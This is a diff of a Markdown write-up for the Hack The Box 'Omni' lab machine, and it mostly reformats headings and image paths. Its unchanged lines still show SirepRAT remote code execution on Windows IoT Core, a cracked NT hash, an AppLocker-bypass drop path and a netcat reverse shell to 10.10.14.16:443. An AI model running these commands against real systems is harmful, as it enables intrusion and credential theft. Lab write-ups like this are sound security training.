@@ -1,10 +1,15 @@
-![](media/f0d212589fe77f32b1442e14a50be791.png)
+![](Assets/HTB-Windows-Easy-omni/547286d87bae2e17e0694432b7e4b920.webp)
 
-Writeup of _OMNI_
+# Writeup of _OMNI_
 
-Easy machine (hackthebox.com)
+#### Easy machine (hackthebox.com)
 
-Sylvain (Javali) Júlio - 08/09/2021
+#### Sylvain (Javali) Júlio - 08/09/2021
+
+---
+
+---
+
 
 # Enumeration
 
@@ -12,20 +17,20 @@ Sylvain (Javali) Júlio - 08/09/2021
 
 For enumeration, after verifying the connection, I always do a nmap scan like this:
 
-![allPorts Scan](Assets/HTB-Windows-Easy-omni/Images/allPorts.png) ![nmap-A](Assets/HTB-Windows-Easy-omni/Images/nmap-A.png)
+![allPorts Scan](Assets/HTB-Windows-Easy-omni/allPorts.png) ![nmap-A](Assets/HTB-Windows-Easy-omni/nmap-A.png)
 
 At this point, we know:
 
 -   Port 135 Open: MSRPC is an interprocess communication (IPC) mechanism that allows client/server software communcation
 -   Port 8080 open: Basic realm=Windows Device Portal - The Windows Device Portal (WDP) is a web server included with Windows devices that lets you configure and manage the settings for the device over a network or USB connection.  Access to port 8080 from the web browser is restricted by basic authentication
 
-![Login 8080](Assets/HTB-Windows-Easy-omni/Images/login_8080.png)
+![Login 8080](Assets/HTB-Windows-Easy-omni/login_8080.png)
 
 After some researches, if we google for _"Windows Device Portal exploit github"_, we can find this tool:
 
 > SirepRAT - RCE as SYSTEM on Windows IoT Core - GitHub (https://github.com/SafeBreach-Labs/SirepRAT)
 
-![Windows IoT Core](Assets/HTB-Windows-Easy-omni/Images/win_IoT_Core.jpg)
+![Windows IoT Core](Assets/HTB-Windows-Easy-omni/win_IoT_Core.jpg)
 
 # Exploitation
 
@@ -49,7 +54,7 @@ sudo tcpdump -i tun0 icmp
 python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c ping 10.10.14.16"
 ```
 
-![RCE Ping](Assets/HTB-Windows-Easy-omni/Images/ping_RCE.png) ![RCE Ping - TCPDump listener](Assets/HTB-Windows-Easy-omni/Images/tcpdump_ping_RCE.png)
+![RCE Ping](Assets/HTB-Windows-Easy-omni/ping_RCE.png) ![RCE Ping - TCPDump listener](Assets/HTB-Windows-Easy-omni/tcpdump_ping_RCE.png)
 
 At this point, we know we have effectively RCE. So, the next step is to get a reverse shell
 
@@ -73,7 +78,7 @@ python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "
 
 We are in the target machine! 
 
-![ipconfig](Assets/HTB-Windows-Easy-omni/Images/ipconfig.png)
+![ipconfig](Assets/HTB-Windows-Easy-omni/ipconfig.png)
 
 # Privesc
 
@@ -139,9 +144,9 @@ john --format=NT --show hashes  # app:mesh5143
 
 I tryied to Invoke_Command with the credentials we get but dont worked... So i tried to login into the website at port 8080
 
-![http logged](Assets/HTB-Windows-Easy-omni/Images/http_logged.png)
+![http logged](Assets/HTB-Windows-Easy-omni/http_logged.png)
 
-![RCE website](Assets/HTB-Windows-Easy-omni/Images/RCE_website.png)
+![RCE website](Assets/HTB-Windows-Easy-omni/RCE_website.png)
 
 We can execute commands directely with Windows Device Portal. But it's always better get a real reverse shell...
 We can't do the same with smbserver, but we can transfere nc64.exe to the target. I always choose C:\Windows\System32\spool\drivers\color\ path because is nearly never blocked (applocker bypass)...
@@ -159,7 +164,7 @@ C:\Windows\System32\spool\drivers\color\nc64.exe -e cmd 10.10.14.16 443
 In the home directory of "app", we can see the user.txt, but we can see another strange file: iot-admin.xml.
 The file looks like this:
 
-![ss-files](Assets/HTB-Windows-Easy-omni/Images/SS-file.png)
+![ss-files](Assets/HTB-Windows-Easy-omni/SS-file.png)
 
 This file is a Powershell Credential. to extract the "Password" field, we can do that:
 
@@ -176,7 +181,7 @@ This file is a Powershell Credential. to extract the "Password" field, we can do
 
 With new credential, we can login on website as user administrator
 
-![web administrator logged](Assets/HTB-Windows-Easy-omni/Images/web-administrator.png)
+![web administrator logged](Assets/HTB-Windows-Easy-omni/web-administrator.png)
 
 Now we can get reverse shell with the same nc64.exe we download before
 
@@ -184,7 +189,7 @@ Now we can get reverse shell with the same nc64.exe we download before
 C:\Windows\System32\spool\drivers\color\nc64.exe -e cmd 10.10.14.16 443
 ```
 
-![administrator reverse shell](Assets/HTB-Windows-Easy-omni/Images/administrator-reverse-shell.png)
+![administrator reverse shell](Assets/HTB-Windows-Easy-omni/administrator-reverse-shell.png)
 
 For the flag, we use the same tecnic to extract the password of the Powershell Credential:
 
